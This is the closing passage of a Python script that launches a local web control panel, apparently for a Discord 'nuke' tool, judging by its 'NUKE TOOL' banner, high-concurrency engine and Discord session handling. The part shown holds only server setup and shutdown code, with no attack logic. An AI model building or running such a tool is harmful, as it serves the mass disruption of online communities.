            continue
        finally:
            probe.close()
    return None


async def main():
    app = web.Application()
    app.router.add_get("/",          handle_index)
    app.router.add_get("/session",   handle_session)
    app.router.add_post("/auth",     handle_auth)
    app.router.add_post("/logout",   handle_logout)
    app.router.add_post("/execute",  handle_execute)
    app.router.add_post("/stop",     handle_stop)
    app.router.add_post("/open_logs",handle_open_logs)
    app.router.add_get("/ws",        handle_ws)
    app.router.add_get("/brand/preview",  handle_brand_preview)
    app.router.add_post("/brand/generate", handle_brand_generate)
    app.router.add_post("/brand/watermark", handle_brand_watermark)

    global PORT
    PORT = _pick_port(PORT)
    if PORT is None:
        print(Fore.RED + "\n  [!] No free port available in 6660-6680 range.\n" + Style.RESET_ALL)
        return

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "127.0.0.1", PORT)
    await site.start()

    url = f"http://127.0.0.1:{PORT}"
    print(Fore.RED + r"""
  ███╗   ██╗██╗   ██╗██╗  ██╗███████╗    ████████╗ ██████╗  ██████╗ ██╗
  ████╗  ██║██║   ██║██║ ██╔╝██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║
  ██╔██╗ ██║██║   ██║█████╔╝ █████╗         ██║   ██║   ██║██║   ██║██║
  ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝         ██║   ██║   ██║██║   ██║██║
  ██║ ╚████║╚██████╔╝██║  ██╗███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗
  ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
    """)
    print(Fore.WHITE + "  " + "─"*70)
    print(Fore.YELLOW + f"  ⚡ MAGMA 100X TURBO SUITE live at: {url}")
    print(Fore.WHITE + "  " + "─"*70 + "\n")

    async def open_browser():
        await asyncio.sleep(0.8)
        webbrowser.open(url)
    asyncio.create_task(open_browser())

    print(Fore.CYAN + "  [*] Turbo Engine active. Concurrency: 250. Press Ctrl+C to terminate.\n")

    if telemetry:
        try:
            telemetry.emit_boot(tool_name(), {"Listen Port": PORT, "Concurrency": CONCURRENCY})
        except Exception:
            pass

    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    finally:
        if discord_session:
            await discord_session.close()
        old_fh = SESSION.get("log_fh")
        if old_fh:
            try: old_fh.close()
            except Exception: pass
        await runner.cleanup()
        print(Fore.MAGENTA + "\n  MAGMA terminated cleanly.\n")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
